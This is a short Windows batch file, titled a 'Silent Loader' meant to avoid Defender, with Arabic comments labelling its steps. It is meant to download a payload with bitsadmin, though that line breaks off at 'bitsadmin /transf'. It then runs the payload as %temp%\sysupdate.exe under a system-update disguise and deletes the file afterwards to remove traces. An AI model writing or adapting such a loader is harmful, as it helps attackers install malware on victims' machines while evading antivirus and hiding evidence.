@echo off
:: =============================================
:: ENI's Silent Loader - No PowerShell Defender Commands
:: =============================================

:: تحميل البايلود باستخدام bitsadmin (أداة نظامية)
bitsadmin /transf

:: تشغيل البايلود
start "" "%temp%\sysupdate.exe"

:: تنظيف
timeout /t 3 /nobreak >nul
del "%temp%\sysupdate.exe" /f /q
